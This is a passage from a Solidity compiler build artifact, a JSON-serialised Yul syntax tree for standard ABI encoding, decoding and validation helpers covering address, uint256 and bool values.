												"nativeSrc": "841:474:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "886:9:2",
														"nodeType": "YulTypedName",
														"src": "886:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "897:7:2",
														"nodeType": "YulTypedName",
														"src": "897:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "909:6:2",
														"nodeType": "YulTypedName",
														"src": "909:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "917:6:2",
														"nodeType": "YulTypedName",
														"src": "917:6:2",
														"type": ""
													}
												],
												"src": "841:474:2"
											},
											{
												"body": {
													"nativeSrc": "1386:53:2",
													"nodeType": "YulBlock",
													"src": "1386:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1403:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "1403:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1426:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1426:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nativeSrc": "1408:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "1408:17:2"
																		},
																		"nativeSrc": "1408:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1408:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1396:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1396:6:2"
																},
																"nativeSrc": "1396:37:2",
																"nodeType": "YulFunctionCall",
																"src": "1396:37:2"
															},
															"nativeSrc": "1396:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "1396:37:2"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nativeSrc": "1321:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1374:5:2",
														"nodeType": "YulTypedName",
														"src": "1374:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1381:3:2",
														"nodeType": "YulTypedName",
														"src": "1381:3:2",
														"type": ""
													}
												],
												"src": "1321:118:2"
											},
											{
												"body": {
													"nativeSrc": "1543:124:2",
													"nodeType": "YulBlock",
													"src": "1543:124:2",
													"statements": [
														{
															"nativeSrc": "1553:26:2",
															"nodeType": "YulAssignment",
															"src": "1553:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "1565:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "1565:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1576:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1576:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1561:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1561:3:2"
																},
																"nativeSrc": "1561:18:2",
																"nodeType": "YulFunctionCall",
																"src": "1561:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1553:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "1553:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "1633:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1633:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1646:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1646:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1657:1:2",
																				"nodeType": "YulLiteral",
																				"src": "1657:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1642:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1642:3:2"
																		},
																		"nativeSrc": "1642:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1642:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "1589:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "1589:43:2"
																},
																"nativeSrc": "1589:71:2",
																"nodeType": "YulFunctionCall",
																"src": "1589:71:2"
															},
															"nativeSrc": "1589:71:2",
															"nodeType": "YulExpressionStatement",
															"src": "1589:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nativeSrc": "1445:222:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1515:9:2",
														"nodeType": "YulTypedName",
														"src": "1515:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "1527:6:2",
														"nodeType": "YulTypedName",
														"src": "1527:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "1538:4:2",
														"nodeType": "YulTypedName",
														"src": "1538:4:2",
														"type": ""
													}
												],
												"src": "1445:222:2"
											},
											{
												"body": {
													"nativeSrc": "1718:32:2",
													"nodeType": "YulBlock",
													"src": "1718:32:2",
													"statements": [
														{
															"nativeSrc": "1728:16:2",
															"nodeType": "YulAssignment",
															"src": "1728:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "1739:5:2",
																"nodeType": "YulIdentifier",
																"src": "1739:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "1728:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "1728:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "1673:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1700:5:2",
														"nodeType": "YulTypedName",
														"src": "1700:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "1710:7:2",
														"nodeType": "YulTypedName",
														"src": "1710:7:2",
														"type": ""
													}
												],
												"src": "1673:77:2"
											},
											{
												"body": {
													"nativeSrc": "1799:79:2",
													"nodeType": "YulBlock",
													"src": "1799:79:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "1856:16:2",
																"nodeType": "YulBlock",
																"src": "1856:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "1865:1:2",
																					"nodeType": "YulLiteral",
																					"src": "1865:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "1868:1:2",
																					"nodeType": "YulLiteral",
																					"src": "1868:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "1858:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "1858:6:2"
																			},
																			"nativeSrc": "1858:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1858:12:2"
																		},
																		"nativeSrc": "1858:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1858:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1822:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1822:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "1847:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "1847:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint256",
																					"nativeSrc": "1829:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "1829:17:2"
																				},
																				"nativeSrc": "1829:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1829:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "1819:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "1819:2:2"
																		},
																		"nativeSrc": "1819:35:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1819:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "1812:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1812:6:2"
																},
																"nativeSrc": "1812:43:2",
																"nodeType": "YulFunctionCall",
																"src": "1812:43:2"
															},
															"nativeSrc": "1809:63:2",
															"nodeType": "YulIf",
															"src": "1809:63:2"
														}
													]
												},
												"name": "validator_revert_t_uint256",
												"nativeSrc": "1756:122:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1792:5:2",
														"nodeType": "YulTypedName",
														"src": "1792:5:2",
														"type": ""
													}
												],
												"src": "1756:122:2"
											},
											{
												"body": {
													"nativeSrc": "1947:80:2",
													"nodeType": "YulBlock",
													"src": "1947:80:2",
													"statements": [
														{
															"nativeSrc": "1957:22:2",
															"nodeType": "YulAssignment",
															"src": "1957:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "1972:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1972:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "1966:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "1966:5:2"
																},
																"nativeSrc": "1966:13:2",
																"nodeType": "YulFunctionCall",
																"src": "1966:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "1957:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "1957:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2015:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2015:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_uint256",
																	"nativeSrc": "1988:26:2",
																	"nodeType": "YulIdentifier",
																	"src": "1988:26:2"
																},
																"nativeSrc": "1988:33:2",
																"nodeType": "YulFunctionCall",
																"src": "1988:33:2"
															},
															"nativeSrc": "1988:33:2",
															"nodeType": "YulExpressionStatement",
															"src": "1988:33:2"
														}
													]
												},
												"name": "abi_decode_t_uint256_fromMemory",
												"nativeSrc": "1884:143:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "1925:6:2",
														"nodeType": "YulTypedName",
														"src": "1925:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "1933:3:2",
														"nodeType": "YulTypedName",
														"src": "1933:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "1941:5:2",
														"nodeType": "YulTypedName",
														"src": "1941:5:2",
														"type": ""
													}
												],
												"src": "1884:143:2"
											},
											{
												"body": {
													"nativeSrc": "2110:274:2",
													"nodeType": "YulBlock",
													"src": "2110:274:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "2156:83:2",
																"nodeType": "YulBlock",
																"src": "2156:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "2158:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "2158:77:2"
																			},
																			"nativeSrc": "2158:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2158:79:2"
																		},
																		"nativeSrc": "2158:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2158:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "2131:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "2131:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "2140:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2140:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "2127:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2127:3:2"
																		},
																		"nativeSrc": "2127:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2127:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2152:2:2",
																		"nodeType": "YulLiteral",
																		"src": "2152:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "2123:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2123:3:2"
																},
																"nativeSrc": "2123:32:2",
																"nodeType": "YulFunctionCall",
																"src": "2123:32:2"
															},
															"nativeSrc": "2120:119:2",
															"nodeType": "YulIf",
															"src": "2120:119:2"
														},
														{
															"nativeSrc": "2249:128:2",
															"nodeType": "YulBlock",
															"src": "2249:128:2",
															"statements": [
																{
																	"nativeSrc": "2264:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "2264:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "2278:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2278:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "2268:6:2",
																			"nodeType": "YulTypedName",
																			"src": "2268:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "2293:74:2",
																	"nodeType": "YulAssignment",
																	"src": "2293:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "2339:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "2339:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "2350:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "2350:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "2335:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "2335:3:2"
																				},
																				"nativeSrc": "2335:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "2335:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "2359:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "2359:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_uint256_fromMemory",
																			"nativeSrc": "2303:31:2",
																			"nodeType": "YulIdentifier",
																			"src": "2303:31:2"
																		},
																		"nativeSrc": "2303:64:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2303:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "2293:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "2293:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_uint256_fromMemory",
												"nativeSrc": "2033:351:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "2080:9:2",
														"nodeType": "YulTypedName",
														"src": "2080:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "2091:7:2",
														"nodeType": "YulTypedName",
														"src": "2091:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "2103:6:2",
														"nodeType": "YulTypedName",
														"src": "2103:6:2",
														"type": ""
													}
												],
												"src": "2033:351:2"
											},
											{
												"body": {
													"nativeSrc": "2455:53:2",
													"nodeType": "YulBlock",
													"src": "2455:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2472:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "2472:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2495:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2495:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nativeSrc": "2477:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "2477:17:2"
																		},
																		"nativeSrc": "2477:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2477:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2465:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2465:6:2"
																},
																"nativeSrc": "2465:37:2",
																"nodeType": "YulFunctionCall",
																"src": "2465:37:2"
															},
															"nativeSrc": "2465:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "2465:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nativeSrc": "2390:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2443:5:2",
														"nodeType": "YulTypedName",
														"src": "2443:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "2450:3:2",
														"nodeType": "YulTypedName",
														"src": "2450:3:2",
														"type": ""
													}
												],
												"src": "2390:118:2"
											},
											{
												"body": {
													"nativeSrc": "2668:288:2",
													"nodeType": "YulBlock",
													"src": "2668:288:2",
													"statements": [
														{
															"nativeSrc": "2678:26:2",
															"nodeType": "YulAssignment",
															"src": "2678:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "2690:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "2690:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2701:2:2",
																		"nodeType": "YulLiteral",
																		"src": "2701:2:2",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2686:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2686:3:2"
																},
																"nativeSrc": "2686:18:2",
																"nodeType": "YulFunctionCall",
																"src": "2686:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "2678:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "2678:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "2758:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2758:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2771:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2771:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2782:1:2",
																				"nodeType": "YulLiteral",
																				"src": "2782:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2767:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2767:3:2"
																		},
																		"nativeSrc": "2767:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2767:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "2714:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2714:43:2"
																},
																"nativeSrc": "2714:71:2",
																"nodeType": "YulFunctionCall",
																"src": "2714:71:2"
															},
															"nativeSrc": "2714:71:2",
															"nodeType": "YulExpressionStatement",
															"src": "2714:71:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nativeSrc": "2839:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2839:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2852:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2852:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2863:2:2",
																				"nodeType": "YulLiteral",
																				"src": "2863:2:2",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2848:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2848:3:2"
																		},
																		"nativeSrc": "2848:18:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2848:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "2795:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2795:43:2"
																},
																"nativeSrc": "2795:72:2",
																"nodeType": "YulFunctionCall",
																"src": "2795:72:2"
															},
															"nativeSrc": "2795:72:2",
															"nodeType": "YulExpressionStatement",
															"src": "2795:72:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value2",
																		"nativeSrc": "2921:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2921:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2934:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2934:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2945:2:2",
																				"nodeType": "YulLiteral",
																				"src": "2945:2:2",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2930:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2930:3:2"
																		},
																		"nativeSrc": "2930:18:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2930:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nativeSrc": "2877:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2877:43:2"
																},
																"nativeSrc": "2877:72:2",
																"nodeType": "YulFunctionCall",
																"src": "2877:72:2"
															},
															"nativeSrc": "2877:72:2",
															"nodeType": "YulExpressionStatement",
															"src": "2877:72:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nativeSrc": "2514:442:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "2624:9:2",
														"nodeType": "YulTypedName",
														"src": "2624:9:2",
														"type": ""
													},
													{
														"name": "value2",
														"nativeSrc": "2636:6:2",
														"nodeType": "YulTypedName",
														"src": "2636:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "2644:6:2",
														"nodeType": "YulTypedName",
														"src": "2644:6:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "2652:6:2",
														"nodeType": "YulTypedName",
														"src": "2652:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "2663:4:2",
														"nodeType": "YulTypedName",
														"src": "2663:4:2",
														"type": ""
													}
												],
												"src": "2514:442:2"
											},
											{
												"body": {
													"nativeSrc": "3004:48:2",
													"nodeType": "YulBlock",
													"src": "3004:48:2",
													"statements": [
														{
															"nativeSrc": "3014:32:2",
															"nodeType": "YulAssignment",
															"src": "3014:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "3039:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "3039:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nativeSrc": "3032:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "3032:6:2"
																		},
																		"nativeSrc": "3032:13:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3032:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "3025:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "3025:6:2"
																},
																"nativeSrc": "3025:21:2",
																"nodeType": "YulFunctionCall",
																"src": "3025:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "3014:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "3014:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nativeSrc": "2962:90:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2986:5:2",
														"nodeType": "YulTypedName",
														"src": "2986:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "2996:7:2",
														"nodeType": "YulTypedName",
														"src": "2996:7:2",
														"type": ""
													}
												],
												"src": "2962:90:2"
											},
											{
												"body": {
													"nativeSrc": "3098:76:2",
													"nodeType": "YulBlock",
													"src": "3098:76:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "3152:16:2",
																"nodeType": "YulBlock",
																"src": "3152:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "3161:1:2",
																					"nodeType": "YulLiteral",
																					"src": "3161:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "3164:1:2",
																					"nodeType": "YulLiteral",
																					"src": "3164:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "3154:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "3154:6:2"
																			},
																			"nativeSrc": "3154:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "3154:12:2"
																		},
																		"nativeSrc": "3154:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "3154:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "3121:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "3121:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "3143:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "3143:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nativeSrc": "3128:14:2",
																					"nodeType": "YulIdentifier",
																					"src": "3128:14:2"
																				},
																				"nativeSrc": "3128:21:2",
																				"nodeType": "YulFunctionCall",
																				"src": "3128:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "3118:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "3118:2:2"
																		},
																		"nativeSrc": "3118:32:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3118:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "3111:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "3111:6:2"
																},
																"nativeSrc": "3111:40:2",
																"nodeType": "YulFunctionCall",
																"src": "3111:40:2"
															},
															"nativeSrc": "3108:60:2",
															"nodeType": "YulIf",
															"src": "3108:60:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nativeSrc": "3058:116:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "3091:5:2",
														"nodeType": "YulTypedName",
														"src": "3091:5:2",
														"type": ""
													}
												],
												"src": "3058:116:2"
											},
											{
												"body": {
													"nativeSrc": "3240:77:2",
													"nodeType": "YulBlock",
													"src": "3240:77:2",
													"statements": [
														{
															"nativeSrc": "3250:22:2",
															"nodeType": "YulAssignment",
															"src": "3250:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "3265:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "3265:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "3259:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "3259:5:2"
																},
																"nativeSrc": "3259:13:2",
																"nodeType": "YulFunctionCall",
																"src": "3259:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "3250:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "3250:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "3305:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "3305:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nativeSrc": "3281:23:2",
																	"nodeType": "YulIdentifier",
																	"src": "3281:23:2"
																},
																"nativeSrc": "3281:30:2",
																"nodeType": "YulFunctionCall",
																"src": "3281:30:2"
															},
															"nativeSrc": "3281:30:2",
															"nodeType": "YulExpressionStatement",
															"src": "3281:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nativeSrc": "3180:137:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "3218:6:2",
														"nodeType": "YulTypedName",
														"src": "3218:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "3226:3:2",
														"nodeType": "YulTypedName",
														"src": "3226:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "3234:5:2",
														"nodeType": "YulTypedName",
														"src": "3234:5:2",
														"type": ""
													}
												],
												"src": "3180:137:2"
											},
											{
												"body": {
													"nativeSrc": "3397:271:2",
													"nodeType": "YulBlock",
													"src": "3397:271:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "3443:83:2",
																"nodeType": "YulBlock",
																"src": "3443:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "3445:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "3445:77:2"
																			},
																			"nativeSrc": "3445:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "3445:79:2"
																		},
																		"nativeSrc": "3445:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "3445:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3418:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3418:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "3427:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "3427:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "3414:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "3414:3:2"
																		},
																		"nativeSrc": "3414:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3414:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "3439:2:2",
																		"nodeType": "YulLiteral",
																		"src": "3439:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "3410:3:2",
																	"nodeType": "YulIdentifier",
